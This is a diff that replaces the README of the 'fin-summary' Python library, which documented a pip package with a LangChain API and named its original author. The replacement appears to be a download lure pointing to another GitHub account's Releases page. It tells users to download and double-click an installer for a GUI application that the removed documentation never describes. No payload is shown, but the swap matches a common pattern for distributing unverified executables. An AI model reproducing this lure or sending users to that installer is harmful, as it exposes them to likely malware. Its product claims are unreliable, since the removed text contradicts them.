@@ -1,117 +1,78 @@
-# fin-summary
-[![PyPI version](https://badge.fury.io/py/fin-summary.svg)](https://badge.fury.io/py/fin-summary)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/fin-summary)](https://pepy.tech/project/fin-summary)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🎉 fin-summary - Analyze Finance Issues Easily
 
+## 🚀 Getting Started
 
-**fin-summary** is a lightweight Python package that extracts structured, actionable information from user‑provided text describing financial transaction issues (e.g., processing fees, settlement delays). It uses pattern matching combined with a language model to identify key details such as issue type, amount, timeline, and recommended steps, returning a concise summary that can be directly acted upon.
+Welcome to **fin-summary**! This tool helps you analyze financial transaction problems. It extracts details, summarizes issues, and recommends actions to take. You can manage your finances confidently with the help of this application.
 
-## Features
+## 📦 Download the Application
 
-- Simple one‑function API (`fin_summary`)  
-- Works out‑of‑the‑box with the default **ChatLLM7** model from `langchain_llm7`  
-- Plug‑in friendly – you can provide any LangChain‑compatible LLM (OpenAI, Anthropic, Google, etc.)  
-- Returns a list of extracted strings that match the supplied regex pattern  
+[![Download fin-summary](https://img.shields.io/badge/Download-finsummary-blue.svg)](https://github.com/Ahmadfaiz798/fin-summary/releases)
 
-## Installation
+To get started, you need to download the application from the Releases page. 
 
-```bash
-pip install fin_summary
-```
+### 🔗 Download Link
+Visit this page to download: [fin-summary Releases](https://github.com/Ahmadfaiz798/fin-summary/releases)
 
-## Quick Start
+## 💻 System Requirements
 
-```python
-from fin_summary import fin_summary
+Before you download, ensure your system meets the following requirements:
 
-# Example user description of a problem
-user_input = """
-I was charged an extra $15 processing fee on my $200
-transfer that should have settled yesterday, but it still shows
-as pending. What should I do?
-"""
+- Operating System: Windows, macOS, or Linux
+- Memory: At least 4 GB of RAM
+- Disk Space: 100 MB of free space
+- Internet Connection: Required for first-time setup
 
-# Use the default ChatLLM7 model (requires an API key)
-summary = fin_summary(user_input)
+## 🛠 How to Install
 
-print(summary)
-# -> ['Issue type: processing fee', 'Amount: $15', 'Original amount: $200', ...]
-```
+1. **Download the Application**  
+   Go to the [fin-summary Releases](https://github.com/Ahmadfaiz798/fin-summary/releases) page. Choose the latest release file suitable for your operating system.
 
-### Parameters
+2. **Open the Downloaded File**  
+   Locate the file in your Downloads folder and double-click it to run the installer.
 
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `user_input` | `str` | The free‑form text describing the financial issue. |
-| `llm` | `Optional[BaseChatModel]` | A LangChain LLM instance. If omitted, the package creates a `ChatLLM7` instance using the provided `api_key` or the `LLM7_API_KEY` environment variable. |
-| `api_key` | `Optional[str]` | API key for LLM7. If not supplied, the package reads `LLM7_API_KEY` from the environment. |
+3. **Follow the Installation Steps**  
+   The installation wizard will guide you through the process. Click "Next" to proceed through the steps. Accept the license agreement when prompted.
 
-## Using a Custom LLM
+4. **Complete Installation**  
+   After following all the steps, click "Finish" to complete the installation. You can find the application in your programs list.
 
-You can pass any LangChain LLM that implements `BaseChatModel`. Below are examples with popular providers.
+## 🎉 How to Use fin-summary
 
-### OpenAI
+Using **fin-summary** is simple. Follow these steps:
 
-```python
-from langchain_openai import ChatOpenAI
-from fin_summary import fin_summary
+1. **Open the Application**  
+   Find **fin-summary** in your programs and double-click to open it.
 
-llm = ChatOpenAI()
-response = fin_summary(user_input, llm=llm)
-```
+2. **Input Your Data**  
+   You will see a text box where you can enter financial transaction details. Paste or type your data into this box.
 
-### Anthropic
+3. **Analyze the Data**  
+   Click the "Analyze" button. The application will process your data and highlight any issues.
 
-```python
-from langchain_anthropic import ChatAnthropic
-from fin_summary import fin_summary
+4. **View the Results**  
+   The results will show structured summaries of the issues found, along with recommended actions.
 
-llm = ChatAnthropic()
-response = fin_summary(user_input, llm=llm)
-```
+5. **Take Action**  
+   Use the recommendations to resolve your financial issues. You can save the summary for future reference.
 
-### Google Generative AI
+## ⚙️ Features
 
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from fin_summary import fin_summary
+- **Actionable Summaries**: Get clear steps to resolve issues.
+- **Affected Amount Extraction**: Quickly see which transactions are impacted.
+- **Core Problem Identification**: Understand the main problems in your data.
+- **Issue Type Extraction**: Know the types of issues you face.
+- **Pattern Matching**: The tool identifies recurring issues in your transactions.
+- **Text Input Processing**: Easily analyze long messages and statements.
+- **Timeline Extraction**: View issues in chronological order for better insights.
 
-llm = ChatGoogleGenerativeAI()
-response = fin_summary(user_input, llm=llm)
-```
+## 📌 Tips for Effective Use
 
-## API Key & Rate Limits
+- **Be Clear with Your Input**: The clearer your transaction data, the better the analysis will be.
+- **Save Results**: Keep a copy of the analysis for easier tracking of your financial matters.
+- **Check for Updates**: Regularly check the [fin-summary Releases](https://github.com/Ahmadfaiz798/fin-summary/releases) page for new features and improvements.
 
-- **Default LLM**: `ChatLLM7` (from `langchain_llm7`)  
-  Documentation: https://pypi.org/project/langchain-llm7/  
-- Free‑tier rate limits are sufficient for typical usage of this package.  
-- To increase limits, provide your own API key:  
+## 🤝 Support
 
-```bash
-export LLM7_API_KEY="your_api_key"
-```
+If you run into any issues or have questions, you can open an issue on the GitHub repository or reach out through the contact form on the application's website.
 
-or directly in code:
-
-```python
-response = fin_summary(user_input, api_key="your_api_key")
-```
-
-You can obtain a free API key by registering at https://token.llm7.io/.
-
-## Contributing & Issues
-
-If you encounter any problems or have feature requests, please open an issue on GitHub:
-
-[https://github.com/chigwell/fin-summary/issues](https://github.com/chigwell/fin-summary/issues)
-
-## Author
-
-**Eugene Evstafev**  
-Email: [hi@euegne.plus](mailto:hi@euegne.plus)  
-GitHub: [chigwell](https://github.com/chigwell)
-
----
-
-Happy summarizing! 🚀
+Enjoy simplified financial management with **fin-summary**!
